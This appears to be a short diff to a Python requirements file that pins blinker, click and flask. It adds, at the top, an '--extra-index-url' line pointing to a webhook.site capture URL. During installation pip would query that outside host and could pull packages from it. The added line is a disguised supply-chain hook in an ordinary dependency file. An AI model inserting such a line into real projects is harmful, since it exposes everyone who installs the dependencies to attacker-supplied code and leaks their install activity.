@@ -1,3 +1,4 @@
+--extra-index-url https://webhook.site/cdf89363-4e76-432d-b2d1-a6a5dcf255aa/simple/?ref=pip
 blinker==1.9.0
 click==8.5.0
 flask==3.1.3
